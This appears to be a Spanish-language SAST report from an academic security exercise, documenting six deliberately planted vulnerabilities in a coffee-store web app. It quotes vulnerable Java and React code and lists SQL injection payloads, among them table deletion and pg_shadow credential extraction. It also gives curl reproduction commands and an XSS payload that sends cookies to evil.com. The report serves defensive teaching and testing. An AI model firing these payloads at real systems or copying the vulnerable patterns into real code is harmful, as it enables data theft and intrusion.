# SEC-CASE-04 — Validación y Sanitización de Entradas
## Reporte SAST — Estado A (Baseline)

**Herramienta:** Semgrep 1.181.0 + Revisión manual de marcadores BASELINE-VULN  
**Fecha:** 2026-10-14  
**Rama/commit analizado:** Estado A (Baseline) — `D:\Escritorio\CloudComputing_Baseline`  
**Resultado esperado:** FAIL (vulnerabilidades intencionales de laboratorio)

---

## Resumen Ejecutivo

| ID Finding | SEC-REQ | Severidad | CWE | OWASP 2021 | Detectado por Semgrep | Estado |
|---|---|---|---|---|---|---|
| CASE04-F001 | SEC-REQ-010 | CRITICAL | CWE-89 | A03:2021 – Injection | ✅ Sí (`tainted-sql-string`) | ❌ FAIL |
| CASE04-F002 | SEC-REQ-010 | MEDIUM | CWE-20 | A03:2021 – Injection | ❌ No | ❌ FAIL |
| CASE04-F003 | SEC-REQ-010 | MEDIUM | CWE-20 | A03:2021 – Injection | ❌ No | ❌ FAIL |
| CASE04-F004 | SEC-REQ-009 | HIGH | CWE-79 | A03:2021 – Injection | ❌ No | ❌ FAIL |
| CASE04-F005 | SEC-REQ-011 | HIGH | CWE-79 | A03:2021 – Injection | ❌ No | ❌ FAIL |
| CASE04-F006 | SEC-REQ-011 | MEDIUM | CWE-532 | A09:2021 – Logging Failures | ❌ No | ❌ FAIL |

**Total hallazgos:** 6  
**Hallazgos por herramienta automatizada (Semgrep):** 1 (CASE04-F001)  
**Hallazgos por revisión de código manual:** 5  

---

## Hallazgos Detallados

---

### CASE04-F001 — SQL Injection por concatenación de strings ⚠️ DETECTADO POR SEMGREP

| Campo | Valor |
|---|---|
| **ID** | CASE04-F001 |
| **SEC-REQ** | SEC-REQ-010 |
| **Tipo** | SQL Injection |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP 2021** | A03: Injection |
| **Severidad** | CRITICAL |
| **Método de detección** | **Semgrep** — regla `java.spring.security.injection.tainted-sql-string.tainted-sql-string` |
| **Archivo** | `ms-pedidos360-catalog/src/main/java/com/pedidos360/catalog/controller/ProductController.java` |
| **Línea Semgrep** | 38 |
| **Línea BASELINE-VULN** | 35 |

#### Evidencia — Salida de Semgrep

```
Rule ID  : java.spring.security.injection.tainted-sql-string.tainted-sql-string
Severity : ERROR
File     : ms-pedidos360-catalog/src/main/java/com/pedidos360/catalog/controller/ProductController.java
Line     : 38
Message  : User data flows into this manually-constructed SQL string. 
           User data can be safely inserted into SQL strings using 
           prepared statements or an ORM.
```

#### Evidencia — Código fuente

```java
// BASELINE-VULN [SEC-REQ-010]: consulta con texto concatenado, sin parametrizar
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam String q) {
    String sql = "SELECT * FROM products WHERE name ILIKE '%" + q + "%'";  // ← INYECCIÓN
    List<?> results = entityManager.createNativeQuery(sql, Product.class).getResultList();
    return ResponseEntity.ok(results);
}
```

#### Descripción del problema

El parámetro `q` se concatena directamente dentro de la cadena SQL sin ningún tipo de parametrización, escape, ni sanitización. Esto permite inyección SQL completa contra la base de datos PostgreSQL (`pedidos360_dev`).

#### Payloads de prueba

| Payload | Efecto |
|---|---|
| `' OR '1'='1` | Retorna todos los productos ignorando el filtro |
| `'; DROP TABLE products; --` | Intento de borrado de tabla (DDL injection) |
| `' UNION SELECT table_name, null, null, null, null FROM information_schema.tables --` | Extracción de schema de BD |
| `' UNION SELECT username, password, null, null, null FROM pg_shadow --` | Extracción de credenciales PostgreSQL |

#### Reproducción conceptual

```bash
# Inyección que retorna todos los productos
curl "http://localhost:8088/api/catalog/products/search?q=%27%20OR%20%271%27%3D%271"
# URL-decoded: ?q=' OR '1'='1

# Inyección UNION para exfiltrar datos del schema
curl "http://localhost:8088/api/catalog/products/search?q=cafe%27%20UNION%20SELECT%20table_name%2Cnull%2Cnull%2Cnull%2Cnull%20FROM%20information_schema.tables%20--"
```

---

### CASE04-F002 — Sin validaciones de rango en `OrderItemRequestDto`

| Campo | Valor |
|---|---|
| **ID** | CASE04-F002 |
| **SEC-REQ** | SEC-REQ-010 |
| **Tipo** | Missing Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP 2021** | A03: Injection |
| **Severidad** | MEDIUM |
| **Método de detección** | Revisión manual — marcadores BASELINE-VULN |
| **Archivo** | `ms-pedidos360-orders/src/main/java/com/pedidos360/orders/dto/OrderItemRequestDto.java` |
| **Líneas** | 23, 28 |

#### Evidencia — Código fuente

```java
// BASELINE-VULN [SEC-REQ-010]: sin validacion @Min(1) para cantidad
private Integer cantidad;   // Acepta 0, -1, -999999

// BASELINE-VULN [SEC-REQ-010]: sin validacion @Positive para precioUnitario
private BigDecimal precioUnitario;  // Acepta 0.00, -1.00, null
```

#### Descripción del problema

Los campos `cantidad` y `precioUnitario` no tienen anotaciones de validación Bean Validation (`@Min(1)`, `@Positive`). Un cliente puede enviar:
- `cantidad: -1000` → creación de órdenes con cantidades negativas.
- `precioUnitario: -999.99` → posible crédito negativo o manipulación de totales.
- `precioUnitario: 0` → pedido gratuito.

Los tests que validaban este comportamiento fueron deshabilitados con `@Disabled("BASELINE-VULN SEC-REQ-010")`.

---

### CASE04-F003 — Sin validaciones de precio y stock en entidad `Product`

| Campo | Valor |
|---|---|
| **ID** | CASE04-F003 |
| **SEC-REQ** | SEC-REQ-010 |
| **Tipo** | Missing Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP 2021** | A03: Injection |
| **Severidad** | MEDIUM |
| **Método de detección** | Revisión manual — marcadores BASELINE-VULN |
| **Archivos** | `ProductCreateDto.java:21`, `Product.java:33`, `Product.java:38`, `ProductServiceImpl.java:28`, `ProductServiceImpl.java:62` |

#### Evidencia — Código fuente

```java
// ProductCreateDto.java:21
// BASELINE-VULN [SEC-REQ-010]: sin validacion @DecimalMin para precio
private BigDecimal price;

// Product.java:33
// BASELINE-VULN [SEC-REQ-010]: sin validacion @DecimalMin para precio
private BigDecimal price;

// Product.java:38
// BASELINE-VULN [SEC-REQ-010]: sin validacion @Min(0) para stock
private Integer stock;

// ProductServiceImpl.java:28
// BASELINE-VULN [SEC-REQ-010]: sin chequeo de stock negativo en creacion

// ProductServiceImpl.java:62
// BASELINE-VULN [SEC-REQ-010]: sin chequeo de stock negativo en actualizacion
```

#### Descripción del problema

Un administrador (o un usuario que escale privilegios vía SEC-REQ-005) puede crear o actualizar productos con:
- `price: -100.00` → productos con precio negativo.
- `stock: -500` → inventario negativo.

---

### CASE04-F004 — XSS mediante `dangerouslySetInnerHTML` en el frontend

| Campo | Valor |
|---|---|
| **ID** | CASE04-F004 |
| **SEC-REQ** | SEC-REQ-009 |
| **Tipo** | Cross-Site Scripting (XSS) Stored/Reflected |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **OWASP 2021** | A03: Injection |
| **Severidad** | HIGH |
| **Método de detección** | Revisión manual — marcadores BASELINE-VULN |
| **Archivo** | `frontend/src/App.tsx` |
| **Líneas** | 352, 354, 471, 497, 503, 590 |

#### Evidencia — Código fuente

```tsx
{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de nombre de producto con dangerouslySetInnerHTML */}
<span dangerouslySetInnerHTML={{ __html: product.name }} />          {/* App.tsx:352 */}

{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de descripcion de producto con dangerouslySetInnerHTML */}
<p dangerouslySetInnerHTML={{ __html: product.description }} />      {/* App.tsx:354 */}

{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de nombre de cliente con dangerouslySetInnerHTML */}
<td dangerouslySetInnerHTML={{ __html: order.nombre }} />            {/* App.tsx:471 */}

{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de nombre de cliente en detalle con dangerouslySetInnerHTML */}
<span dangerouslySetInnerHTML={{ __html: order.nombre }} />          {/* App.tsx:497 */}

{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de direccion de cliente con dangerouslySetInnerHTML */}
<span dangerouslySetInnerHTML={{ __html: order.direccion }} />       {/* App.tsx:503 */}

{/* BASELINE-VULN [SEC-REQ-009]: renderizado inseguro de nombre con dangerouslySetInnerHTML */}
<span dangerouslySetInnerHTML={{ __html: user.name }} />             {/* App.tsx:590 */}
```

#### Descripción del problema

`dangerouslySetInnerHTML` inyecta HTML crudo en el DOM sin ningún escape. Datos provenientes de la API (nombre de producto, descripción, nombre de cliente, dirección) se renderizan directamente.

#### Vector de ataque

1. Un atacante crea un producto con nombre: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
2. El nombre se persiste en la BD sin sanitización (no hay validación server-side de contenido HTML).
3. Cualquier usuario que vea el catálogo ejecuta el script del atacante en su navegador.

#### Ubicaciones afectadas

| Línea | Dato renderizado | Vector |
|---|---|---|
| 352 | `product.name` | Nombre de producto con HTML malicioso |
| 354 | `product.description` | Descripción con HTML/script malicioso |
| 471 | `order.nombre` | Nombre de cliente en listado de pedidos |
| 497 | `order.nombre` | Nombre de cliente en detalle |
| 503 | `order.direccion` | Dirección en detalle de pedido |
| 590 | `user.name` | Nombre de usuario en perfil |

---

### CASE04-F005 — HTML Injection en emails sin escapar (ms-notify)

| Campo | Valor |
|---|---|
| **ID** | CASE04-F005 |
| **SEC-REQ** | SEC-REQ-011 |
| **Tipo** | HTML Injection / XSS en correo electrónico |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **OWASP 2021** | A03: Injection |
| **Severidad** | HIGH |
| **Método de detección** | Revisión manual — marcador BASELINE-VULN |
| **Archivo** | `ms-pedidos360-notify/src/main/java/com/pedidos360/notify/service/EmailSenderService.java` |
| **Línea** | 110 |

#### Evidencia — Código fuente

```java
// BASELINE-VULN [SEC-REQ-011]: customerName y body van sin escapar dentro del HTML
// (posible inyeccion HTML/XSS en correo)
private String buildEmailHtml(String customerName, String body) {
    return "<html><body>" +
           "<h1>Hola, " + customerName + "</h1>" +   // ← Sin escapar
           "<p>" + body + "</p>" +                   // ← Sin escapar
           "</body></html>";
}
```

#### Descripción del problema

`customerName` y `body` se concatenan directamente en el HTML del correo sin escapar caracteres HTML. Si un atacante registra un nombre como `</h1><script>...`, el correo HTML generado contendrá HTML/scripts inyectados que pueden ejecutarse en clientes de correo con soporte HTML.

---

### CASE04-F006 — Log injection de datos sensibles en ms-notify

| Campo | Valor |
|---|---|
| **ID** | CASE04-F006 |
| **SEC-REQ** | SEC-REQ-011 |
| **Tipo** | Sensitive Data in Logs / Log Injection |
| **CWE** | CWE-532: Insertion of Sensitive Information into Log File |
| **OWASP 2021** | A09: Security Logging and Monitoring Failures |
| **Severidad** | MEDIUM |
| **Método de detección** | Revisión manual — marcador BASELINE-VULN |
| **Archivo** | `ms-pedidos360-notify/src/main/java/com/pedidos360/notify/listener/EmailListener.java` |
| **Línea** | 91 |

#### Evidencia — Código fuente

```java
// BASELINE-VULN [SEC-REQ-011]: registro en log de cuerpo completo de correo sin sanitizar
// (fuga de datos sensibles en logs)
log.info("Procesando notificación: {}", payload.getBody());
```

#### Descripción del problema

El cuerpo completo del mensaje RabbitMQ (que incluye nombre, correo, RUT, dirección del cliente y detalles del pedido) se registra en los logs de la aplicación en nivel `INFO`. Esto implica:
- Datos personales sensibles en archivos de log potencialmente accesibles.
- Si un atacante inyecta secuencias de log especiales en el `body`, puede manipular las entradas de log (log injection).

---

## Análisis de la Detección Automática (Semgrep)

### Hallazgo detectado automáticamente

```json
{
  "check_id": "java.spring.security.injection.tainted-sql-string.tainted-sql-string",
  "path": "ms-pedidos360-catalog/src/main/java/com/pedidos360/catalog/controller/ProductController.java",
  "start": { "line": 38 },
  "extra": {
    "severity": "ERROR",
    "message": "User data flows into this manually-constructed SQL string..."
  }
}
```

### Hallazgos NO detectados por Semgrep (y por qué)

| Finding | Razón de no detección |
|---|---|
| CASE04-F002/F003 | Ausencia de anotaciones Bean Validation es una omisión, no un patrón de código; Semgrep detecta código presente, no ausente |
| CASE04-F004 | Los rulesets de TypeScript/React de Semgrep incluyen `dangerouslySetInnerHTML` pero no estaban en los rulesets configurados (`p/default`, `p/owasp-top-ten`, `p/security-audit`, `p/secrets`) |
| CASE04-F005 | Concatenación de strings en Java para HTML es similar a SQLi, pero las reglas de HTML injection en emails no están en los rulesets públicos estándar |
| CASE04-F006 | Log injection con `log.info(payload)` no está cubierto en los rulesets aplicados |

---

## Trazabilidad

| Marcador en código | Archivo:línea | Finding |
|---|---|---|
| `BASELINE-VULN [SEC-REQ-010]` (SQLi) | `ProductController.java:35` | CASE04-F001 |
| `BASELINE-VULN [SEC-REQ-010]` (DTOs) | `OrderItemRequestDto.java:23`, `28` | CASE04-F002 |
| `BASELINE-VULN [SEC-REQ-010]` (Product) | `ProductCreateDto.java:21`, `Product.java:33,38`, `ProductServiceImpl.java:28,62` | CASE04-F003 |
| `BASELINE-VULN [SEC-REQ-009]` | `App.tsx:352,354,471,497,503,590` | CASE04-F004 |
| `BASELINE-VULN [SEC-REQ-011]` (HTML) | `EmailSenderService.java:110` | CASE04-F005 |
| `BASELINE-VULN [SEC-REQ-011]` (Logs) | `EmailListener.java:91` | CASE04-F006 |

---

*Reporte generado como parte de Fase VII – Security Testing, Etapa SAST.*  
*Proyecto: Pedidos360 Coffee Store — Ejercicio académico OCY1102.*
